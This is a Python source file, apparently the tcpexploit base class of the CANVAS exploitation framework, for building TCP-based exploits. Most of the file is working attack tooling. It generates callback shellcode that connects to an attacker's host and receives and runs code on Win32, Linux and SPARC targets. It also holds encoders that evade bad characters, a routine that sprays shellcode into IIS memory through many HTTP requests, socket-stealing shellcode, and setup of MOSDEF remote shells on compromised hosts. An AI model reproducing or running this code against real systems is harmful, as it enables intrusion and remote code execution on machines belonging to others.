#! /usr/bin/env python

"""

tcpexploit.py

Most tcp exploits are the same. This file encapsulates the TCP type.

"""

CHANGELOG="""
August 10, 2003 Added stuffshellcode 

April 5, 2003 Added SPARC routines
"""
      
import os,getopt
import sys
import socket
from exploitutils import *
from encoder import *
import traceback
import timeoutsocket
import time
from shellcode import shellcodeGenerator, linuxshell
from canvasexploit import canvasexploit
from shellcode import win32shell
from MOSDEF import mosdef as mosdef

from encoder import intel_nibbleencoder

from win32Node import win32Node
import win32MosdefShellServer


class tcpexploit(canvasexploit):
    #start constants (static members of this class)
    #used for quicky banner checks
    HTTPHEAD="HEAD / HTTP/1.0\r\n\r\n"
    
    def __init__(self):
        canvasexploit.__init__(self)
        self.port=0
        self.user=""
        self.password=""
        self.tag1="AABB"
        self.tag2="ACAC"
        self.ssl=0
        self.subesp=0
        self.badstring=""
        self.searchbadstring=""
        #some default badstrings
        self.default_badstrings={}
        #ff is doubled in TELNET (which is what FTP is)
        self.default_badstrings["ftp"]="\r\n\x00"
        self.sslsock=None
        
    def setHost(self,host):
        self.host=host
        return

    def connectTo(self, t_host=None, t_port=None):
        "Bas's little connecter shortcut"
        #if you don't specify, it connects to your host and port
        if t_host==None:
            t_host=self.target.interface
        if t_port==None:
            t_port=self.port
        s = self.gettcpsock()
        try:
            s.connect((t_host, t_port))
        except:
            return None
        return s
    
    def setHelperHost(self, host):
        self.helperhost = host
        return

    def setShellcode(self,shellcode):
        self.shellcode=shellcode
        return

    def createShellcode(self):
        return 1
    
    def ftplogin(self,banner=None):
        """
        Connects to a remote FTP server and logs in
        returns socket if successful
        otherwise 0
        """
        s=self.gettcpsock()
        try:
            self.log("Connecting to %s:%d"%(self.host,self.port))
            s.connect((self.host, self.port))
        except (socket.error, timeoutsocket.Timeout):
            self.log("No connection could be established")
            self.result_error=self.ERR_COULD_NOT_CONNECT
            return 0
        try:
            data=s.recv(5000)
        except timeoutsocket.Timeout:
            data=""
        except socket.error:
            self.log('Error while reading data')
            s.close()
            return 0
        
        self.log("Banner from FTP: %s"%prettyprint(data))

        #check to see if a banner was specified
        if banner and banner not in data:
            self.log("Not %s!"%banner)
            self.result_error=self.ERR_NO_VERSION
            return 0
        
        s.sendall("USER %s\r\n"%self.user)
        try:
            data=s.recv(5000)
        except (socket.error, timeoutsocket.Timeout):
            self.log("No USER response")
            return 0
        
        self.log("Result from FTP: %s"%prettyprint(data))
        s.sendall("PASS %s\r\n"%self.password)
        try:
            data=s.recv(5000)
        except (socket.error, timeoutsocket.Timeout):
            self.log("No PASS response")
            return 0
        
        self.log("Result from FTP: %s"%prettyprint(data))
        if "530" in data:
            self.log("Username/password failed!")
            self.result_error=self.ERR_NO_LOGIN
            return 0
        #sucess, return socket
        return s 
    
    def createWin32SearchShellcodeNibble(self,localhost,localport,rawshellcode=None):
        """
        Creates a mosdef search shellcode encoded with nibble_encoder.py
        """
        #print "Calling back to %s:%s"%(localhost,localport)
        #print "Rawshellcode=%s"%rawshellcode
        ret=self.createWin32Shellcode(self.badstring,localhost,localport,rawshellcode)

        if not ret:
            return ret
        #we're going to  search for it, so we add tag1 and tag2 to the front.
        #Tag2 must come before tag1!!!
        self.shellcode=self.tag2+self.tag1+self.shellcode
        self.searchcode=win32shell.getsearchcode(self.tag1,self.tag2)
        encoder=nibble_encoder.intel_nibbleencoder()
        encoder.setbadstring(self.searchbadstring)
        self.encodedsearchcode=encoder.encode(self.searchcode)
        if not self.encodedsearchcode:
            return None
        #self.searchcode=win32shell.getsearchcode(self.tag1,self.tag2)
        self.log("Length of search shellcode: %d, length of real shellcode: %d\n"%(len(self.searchcode), len(self.shellcode)))
        #print prettyprint(self.encodedsearchcode)
        for c in self.badstring:
            if c in self.encodedsearchcode:
                self.log("%s in encodedsearchcode. :<"%prettyprint(c))
                self.log("%s"%prettyprint(self.encodedsearchcode))  
        return 1
     
    def createSparcShellcode(self, badstring, localhost,localport,rawshellcode=""):
        if rawshellcode in ["",None]:
            print "Generating typical sparc shellcode"
            sc=shellcodeGenerator.solarisSparc()
            #solaris
            #sc.addAttr("subsp",[1000])
            sc.addAttr("connect",{"ipaddress": localhost, "port": localport})
            sc.addAttr("RecvExec",None)
            rawshellcode=sc.get()
        #new encoder setup
        encoder=addencoder.sparcaddencoder()
        #these are the characters not allowed by the exploit
        encoder.setbadstring(badstring)

        self.log( "Encoding shellcode. This may take a while if we don't find a good value in the cache.")
        shellcode=encoder.encode(rawshellcode)
        self.log( "Done encoding shellcode.")
        if shellcode=="":
            self.log( "Could not encode shellcode")
            return 0
        self.shellcode=shellcode
        print "Created shellcode - len=%d"%(len(shellcode))
        return 1

    def createLinuxFindSckCode(self,s):
        """
        Creates, if possible, an x86 linux find sck code, which will find the socket,
        then read 0x500 bytes from it, and then execute that
        """
        port=s.getsockname()[1]
        encoder=chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)
        rawshellcode=linuxshell.getcommonfindsckcode(port)
        if self.badstring=="":
            return rawshellcode
        #self.log("rawshellcode (%d) = %s"%(len(rawshellcode),prettyprint(rawshellcode)))
        shellcode=encoder.encode(rawshellcode)
        #self.log("shellcode (%d) = %s"%(len(shellcode),prettyprint(shellcode)))
        if shellcode=="":
            self.log( "Could not encode shellcode")
            return 0
        self.setShellcode(shellcode)
        
        self.shellcode_stage2=self.getLinuxStage2()
        return 1  
    
    def getLinuxStage2(self):
        return linuxshell.getcommonstage2()
    
    def createLinuxGOShellcode(self,badstring, oldcode = 0):
        if not oldcode:
            rawshellcode=linuxshell.getNewGOcode()
        else:
            rawshellcode=linuxshell.getGOcode()
            
        #print "Shellcode is length %d"%len(rawshellcode)
        
        if badstring=="":
            self.setShellcode(rawshellcode)
            return rawshellcode
        if badstring!="":
            encoder=chunkedaddencoder.intelchunkedaddencoder()
            encoder.setbadstring(self.badstring)
            #self.log("rawshellcode (%d) = %s"%(len(rawshellcode),prettyprint(rawshellcode)))
            shellcode=encoder.encode(rawshellcode)
            #self.log("shellcode (%d) = %s"%(len(shellcode),prettyprint(shellcode)))
            if shellcode=="":
                self.log( "Could not encode shellcode")
                return 0
            
        self.setShellcode(shellcode)
        
        self.shellcode_stage2=self.getLinuxStage2()
        return 1  
    
    def createLinuxGOcodeWithShell(self,badstring):
        rawshellcode=linuxshell.getNewGOcodeWithShell()
        print "Shellcode is length %d"%len(rawshellcode)
        if badstring=="":
            self.setShellcode(rawshellcode)
            return rawshellcode
        if badstring!="":
            encoder=chunkedaddencoder.intelchunkedaddencoder()
            encoder.setbadstring(self.badstring)
            #self.log("rawshellcode (%d) = %s"%(len(rawshellcode),prettyprint(rawshellcode)))
            shellcode=encoder.encode(rawshellcode)
            #self.log("shellcode (%d) = %s"%(len(shellcode),prettyprint(shellcode)))
            if shellcode=="":
                self.log( "Could not encode shellcode")
                return 0
        self.setShellcode(shellcode)
        self.shellcode_stage2=self.getLinuxStage2()
        return 1  

    # dave stylee
    def createHeapSafeInject(self, badstring, localhost, localport, injectme="",setdebugprivs=0):
        if injectme in ["", None]:
            sc = shellcodeGenerator.win32()
            sc.addAttr("findeipnoesp",{"subespval": 0x1000 }) 
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)
            sc.addAttr("tcpconnect", {"port" : localport, "ipaddress" : localhost})
            sc.addAttr("CreateThreadRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
            #sc.addAttr("RecvExecWin32", {"socketreg": "FDSPOT"})
            sc.addAttr("ExitThread", None)

            self.callback.argsDict["fromcreatethread"] = 1
            injectme = sc.get()
        #    print "Dumping InjectMe Code:" + sc.getcode()

        sc = shellcodeGenerator.win32()
        sc.addAttr("findeipnoesp", {"subespval": 0})
        sc.addAttr("HeapSafeInject", { "injectme" : injectme, "setdebugprivs" : setdebugprivs })
        sc.addAttr("ExitThread", None)
        injectcode = sc.get()

        #print "Dumping HeapSafeInject Code:" + sc.getcode()

        rawshellcode = injectcode

        if badstring=="":
            self.shellcode=rawshellcode
            return rawshellcode

        self.log("Raw shellcode (before encoding) is %d byte"%len(rawshellcode))
        encoder=chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(badstring)
        self.log( "Encoding shellcode. This may take a while if we don't find a good value in the cache.")
        shellcode=encoder.encode(rawshellcode)         
        self.log( "Done encoding shellcode.")
        if shellcode=="":
            self.log( "Could not encode shellcode")
            raise "ErrorEncodingShellcode"
        self.setShellcode(shellcode)
        
        return shellcode

    def init_ssl_sock(self,s):
        """Used by websend and webrecv"""
        try:
            if self.sslsock==None:
                self.sslsock=socket.ssl(s._sock)
        except TypeError:
            self.sslsock=s
        except AttributeError:
            self.sslsock=s               
        return self.sslsock
        
    def websend(self,s,sploitstring):
        if self.ssl:
            self.init_ssl_sock(s)
            #print "Sploitstring: %s"%repr(sploitstring)
            self.sslsock.sendall(sploitstring)
        else:
            #using sendall rocks
            try:
                if self.covertness>=9:
                    snort_websend(s,sploitstring)
                else:
                    sent = s.sendall (sploitstring)
            except socket.error:
                pass
        return 
            


    def webrecv(self,s,size=1000):
        if self.ssl:
            self.init_ssl_sock(s)
            try:
                result=""
                data="A"
                length=0
                while data!="" and length<size:
                    try:
                        #print "Reading %s"%(size-length)
                        data = self.sslsock.read(size-length)
                    except:
                        data=""
                    result+=data
                    if len(data) < (size-length):
                        break
                    length=len(result)
            except:
                traceback.print_exc(file=sys.stdout)
                result=""  
        else:
            try:
                result = s.recv(size)
            except:
                result="" 
        #self.log("result="+(result))
        return result
     
    
    def getWebServer(self,sock):
        self.websend(sock,"HEAD / HTTP/1.0\r\n\r\n")
        data=self.webrecv(sock)
        alist=data.split("\r\n")
        for line in alist:
            if line=="":
                #we didn't see a Server: line!
                return None
            if line.count("Server: "):
                server=line.split("Server: ")[1].strip()
                return server
        #we never get here
        return None
    
    def stuffshellcode(self,url="/"):
        """Shoves our shellcode into the memory space of a target with many HTTP requests

        Really useful for IIS bugs

        If we cannot connect() then it means
        a) the process has crashed (unlikely)
        b) the process has used up all it's listening threads (likely if the
           machine is very slow or almost out of memory and swapping a lot)

        to handle b) we have a stepup timer that sends connection requests
        slower, if we are having this problem.

        If it is a) we're out of luck anyways.
        
        """
        self.log("Putting our shellcode into memory with many requests.")
        packet="GET %s HTTP/1.1\r\n"%url
        packet+="Host: localhost\r\n"
        packet+="Content-length: 5006000\r\n"
        packet+="User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\r\n"
        packet+="Connection: Keep-Alive\r\n"
        #packet+="Authorization: Basic "+("DD\eb\05"*(1000/4)+"AAAAA"+self.shellcode)*4+"\r\n"
        packet+="\r\n"
        #12 a's so we don't jump over it
        #1 extra a in case we want to replace it with a 0xcc (int 3)
        packet+=("DD\xeb\x0c"*(2000/4)+"A"*0x0c+"A"+self.shellcode)*40
        

        s_array=[]
        top=1000
        sleeptime=0
        successful=0
        timeperrequest=1
        eta=100
        for i in range(1,top):
            try:
                time.sleep(sleeptime)
                time1=time.time()
                #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s=self.gettcpsock()
                s.connect((self.host, self.port))
                successful+=1
                if successful==5:
                    successful=0
                    if sleeptime>0:
                        sleeptime= sleeptime-0.1
                        if sleeptime<0:
                            sleeptime=0
            except:
                try:
                    time.sleep(5)
                    sleeptime+=.5
                    #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s=self.gettcpsock()
                    s.connect((self.host, self.port))                    
                except:
                    self.log("Request %d Couldn't connect to target when trying to stuffshellcode()!"%i)
                    return (None,s_array)
            s_array.append(s)
            self.websend(s,packet)
            time2=time.time()
            timeperrequest=time2-time1
            if i%5==0: #only change it every 5th time so it's readable
                eta=timeperrequest*(top-i)
            self.log("Sent stuff shellcode request number %d/%d Sleeptime=%3.1f eta=%3.0f seconds\r"%(i,top,sleeptime,eta))
            #s.close()
            #sleep for a second to give server a chance to process information
            #time.sleep(.4)                        
            
        self.log("Done shoving our shellcode into memory.")
        return (top,s_array)
    
    # this function tries to be portable
    def checkTriggerGOOOcode(self, s, trigger = "GOOO", timeout_pretrigger = 10, timeout_posttrigger = 2, send_trigger = True):
        self.log("Checking trigger")
        s.set_timeout(timeout_pretrigger)
        if send_trigger:
            s.send(trigger)
        try:
            buf = s.recv(256, 0)
        except:
            return 0
        self.log("GOT: %s"% buf)
        if buf.count(trigger):
            self.log("Got trigger %s! sending response" % buf)
            s.set_timeout(timeout_posttrigger)
            return 1
        self.log("No trigger in response (%d: %s)"% (len(buf), buf))
        return 0

    # deprecated old code, patch of patch for old shellcodes
    def checkTriggerGOcode(self, s, falsepositive=0):
        self.log("Checking trigger")
        s.set_timeout(10)
        trigger = ""
        try:
            # try and get all cued data
            trigger = s.recv(256, 0)
        except:
            return 0
        self.log("GOT: %s"% trigger)
        if falsepositive:

            if trigger.count("GOOO"):
                self.log("Got trigger GOOO! Cleaning socket and sending response")
                # Make sure the socket is clean
                s.set_timeout(2)
                # we give remote some time to handle all it's business
                # this is important for socket cleanup on += 1 increments
                # in our trigger opcode
                time.sleep(2)
                clean = ""
                try:
                    clean = s.recv(256, 0)
                except:
                    self.log("Socket is clean")
                self.log("Socket cleanup (%s)"% clean)
                # send trigger 
                s.sendall("O")  
                return 1
        else:

            if trigger.count("G"):
                self.log("Got trigger G! Cleaning socket and sending response")
                # Make sure the socket is clean
                s.set_timeout(2)
                # we give remote some time to handle all it's business
                # this is important for socket cleanup on += 1 increments
                # in our trigger opcode
                time.sleep(2)
                clean = ""
                try:
                    clean = s.recv(256, 0)
                except:
                    self.log("Socket is clean")
                self.log("Socket cleanup (%s)"% clean)
                # send trigger 
                s.sendall("O")  
                return 1

        self.log("No trigger in response (%s)"% trigger)
        return 0
            
    def checkTriggerWin32(self, s, falsepositive=0):
        return self.checkTriggerGOcode(s, falsepositive=falsepositive)
    
    def checkTriggerSolaris(self,s):
        return self.checkTriggerGOcode(s)
        
    def doGOMOSDEFWin32(self, s,currentNode=None):
        s.set_timeout(20)
        self.log("Trying to start MOSDEF...")
        
        import win32MosdefShellServer
        from win32Node import win32Node
        newshell=win32Node()
        if currentNode:
            pnode=currentNode
        else:
            pnode=self.argsDict["passednodes"][0]
        newshell.parentnode=pnode
        pnode.newNode(newshell)

        shell=win32MosdefShellServer.win32shellserver(s,newshell,logfunction=self.log)

        if not shell:            
            self.log("Could not make a shell object from active socket") 
            return 0
        ret = shell.startup()
        if not ret:
            self.log("Failed to initialise MOSDEF")
            return 0         
        shell.started = 1
        return newshell
     
    def setSSL(self,ssl):
        self.ssl=ssl
        

    def checkisapiGO(self,s):
        """looks for isapi GOcode. Returns data pulled from web server
        if unsuccessful
        On success does handshake and 
        """
        data=self.webrecv(s,size=4)
        if data!="GGGG":
            return data
        self.log("ISAPI GO CODE DETECTED!")
        #otherwise we found it!
        #the next bytes are READCLIENT,WRITECLIENT, and CONTEXTPOINTER (4 bytes each, of course)
        import win32MosdefShellServer
        from win32Node import win32Node
        node=win32Node()
        node.parentnode=self.argsDict["passednodes"][0]
        #s is actually a socket object or an SSL object here
        newshell = win32MosdefShellServer.win32shellserver(s,node,self.logfunction)
        newshell.argsDict["isapidict"]={"ssl": self.ssl,"exploit":self}
        newshell.startup()
        node.startup()
        self.newnode=node
        self.succeeded=1
        return ""
    
    def createSmallWin32GOShellcode(self,startsock=0x100,subesp=0):
        """
        No ordinal anymore...
        """
        #self.shellcode="\xcc"*400
        #return 1
        sc=shellcodeGenerator.win32()
        sc.addAttr("GOFindSock",{"startsock": startsock})
        #sc.addAttr("LoadRegAsFD", {"reg" : "esi"})
        sc.addAttr("RecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
        #sc.addAttr("UseWS2Ordinal",None)
        rawshellcode= sc.get()
        if not self.badstring:
            return rawshellcode
        
        self.shellcode=self.intel_encode(self.badstring, rawshellcode)
        self.log("Length of shellcode=%s"%len(self.shellcode))
        return self.shellcode

    def createWin32GOShellcode(self,startsock=0x100,subesp=0):
        #self.shellcode="\xcc"*400
        #return 1
        sc=shellcodeGenerator.win32()
        sc.addAttr("GOFindSock",{"startsock": startsock})
        sc.addAttr("RecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
        rawshellcode= sc.get()
        if not self.badstring:
            return rawshellcode
        
        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)
        self.log("Encoding shellcode")
        self.shellcode = encoder.encode(rawshellcode)
        if self.shellcode == "":
            self.log("Problem encoding shellcode")
            return 0
        return self.shellcode
    
    def getargs(self):
        """ default args for a tcp exploit """
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return 
    
    def bannerchecktest(self,bannersDict,datasize=1000,sendstr=None,sleeptime=0.5,ssl=0):
        """
        Useful routine to look for a banner in our returned data and set our version
        """
        self.getargs()
        self.log("Testing host %s port %s"%(self.host,self.port))
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s=self.gettcpsock()
        try:
            s.connect((self.host, self.port))
            if ssl:
                self.ssl=1
            if sendstr:
                self.websend(s,sendstr)
            time.sleep(sleeptime)
            data=self.webrecv(s,datasize)
            self.log("Data=%s"%prettyprint(data))
        except:
            #import traceback
            #traceback.print_exc(file=sys.stdout)
            self.log("No connection could be established")
            return 0
        for key in bannersDict:
            if key in data:
                self.version=bannersDict[key]
                self.log("Banner matched version %s: %s"%(self.version,self.versions[self.version][0]))
                return 1
        self.log("Didn't find a banner in our returned data :<")
        return 0
 
    def win32NonCallbackShellcodeCheck(self):
        """
        Tries to connect to a bind shellcode on the remote server
        returns our new Node on success, otherwise returns None
        
        See msrpcexploit.py for an example of usage
        """
        
        if self.callback != None and self.callback.ip == "0.0.0.0": # check for BindMosdef
            s = self.gettcpsock()
            try:
                self.log("Trying Bind Mosdef mode on port %d..."%self.callback.port)
                s.connect((self.target.interface, self.callback.port))
            except:
                self.log("Connection did not succeed to port %d"%self.callback.port)
                self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port), showlog=True)
                return None
        else:
            return None
            
        # got a connection, verify with GO handshake
        if self.checkTriggerWin32(s):
            self.log("Got a Bind Mosdef socket!")
            node = win32Node()
            node.parentnode = self.argsDict["passednodes"][0]
            newshell = win32MosdefShellServer.win32shellserver(s, node,self.logfunction)
            newshell.argsDict["fromcreatethread"] = 1
            newshell.node.startup()
            self.setInfo("%s attacking %s:%d (succeeded!)"%(self.name, self.host, self.port), showlog=True)
            return newshell.node
        return None
    
    def createWin32Peek(self,ordinal=1,echomarker=1,subesp=0):
        """
        Creates a win32 socket stealing shellcode using the MSG_BIND technique
        Avg size: XXXX
        """
        sc=shellcodeGenerator.win32()
        sc.addAttr("FindPeekSock", {"EchoMarker": echomarker})
        sc.addAttr("LoadRegAsFD", {"reg" : "esi"})
        sc.addAttr("RecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
        if ordinal:
            sc.addAttr("UseWS2Ordinal",None)

        rawshellcode=sc.get()
        enc=xorencoder.simpleXOR()
        enc.subesp=subesp
        enc.setbadstring(self.badstring)
        ret=enc.find_key(rawshellcode)
        if ret==0:
            self.log("Could not generate key for this shellcode!")
            self.log("Failed to use xor encoder...using chunked")
            encoder=chunkedaddencoder.intelchunkedaddencoder()
            encoder.setbadstring(self.badstring)
            self.log( "Encoding shellcode. This may take a while if we don't find a good value in the cache.")
            shellcode=encoder.encode(rawshellcode)         
            self.log( "Done encoding shellcode.")
            if shellcode=="":
                self.log( "Could not encode shellcode")
                raise "ErrorEncodingShellcode"
            self.shellcode=shellcode

        else:
            self.shellcode=enc.encode(rawshellcode)
            
        self.log("Xor key used: %x"%enc.getkey())
        self.log("Length of shellcode=%s"%len(self.shellcode))
        return self.shellcode

    def dumpEchoMarker(self,s):
        """used for peek code"""
        time.sleep(50)
        #second stage...
        if 0:
            sc=shellcodeGenerator.win32()
            sc.addAttr("loadFDasreg",{"reg":"esi"})
            #I want to set the FD as blocking here too!
            sc.addAttr("RecvExecWin32", None)
            stage2=sc.get()
            stage2="\xcc"+stage2
        else:
            stage2=""
        self.log("Dumping echo marker + stage2 of size %d"%len(stage2))
        s.sendall(intel_order(0x44434241)+stage2)
        return 
    
    def collectEchoMarker(self,s):
        """used for peek code"""
        import win32MosdefShellServer
        from win32Node import win32Node
        data=s.recv(4)
        if data=="ABCD":
            self.log("Got echo marker!")
        else:
            self.log("Got wrong marker: %s"%prettyprint(data))
            return None
        self.log("Initializing Win32Node")
        node = win32Node()
        node.parentnode=self.argsDict["passednodes"][0]
        win32MosdefShellServer.win32shellserver(s,node,self.logfunction)
        node.startup()
        self.log("Finished initializing win32Node")
        self.setInfo("%s Done (successfully stole socket!)"%self.name)
        return node

    def imap_login(self):
        """
        Logs into IMAP server - returns True if successful
        """
        self.s=self.gettcpsock()
        try:
            self.s.connect((self.host, self.port))
        except socket.error, msg:
            self.log("Could not connect")
            return False
        
        #read banner
        try:
            data=self.s.recv(1000)
        except:
            data=""
            self.log("No banner")
        self.log("Banner: %s"%prettyprint(data))
        self.banner=data
        self.log("Using: %s:%s"%(self.user, self.password))
        login='0001 LOGIN "%s" "%s"\r\n'%(self.user, self.password)
        self.log("Login string: %s"%login)
        try:
            self.s.sendall(login)
        except:
            self.log("Cannot send login")
            return False
        
        #recv response
        try:
            data=self.s.recv(1000)
        except:
            self.log("No response from server")
            return False
        
        self.log("Response: %s"%prettyprint(data))
        if data.count("NO LOGIN"):
            self.log("Login failure")
            return False 
        return True 
            
        
def main():

    from listenerLine import fakeListenerLine

    te          = tcpexploit()
    shellcode   = te.createLinuxGOShellcode("\r\n ")
    print "Shellcode Length: %d" % len(te.shellcode)
    line_wrap = 16
    sys.stdout.write('"')
    for c in te.shellcode:
        sys.stdout.write("\\x%.2x" % ord(c))
        line_wrap -= 1
        if not line_wrap:
            sys.stdout.write('"\n"')
            line_wrap = 16
    sys.stdout.write('"\n')

if __name__=="__main__":
    main()
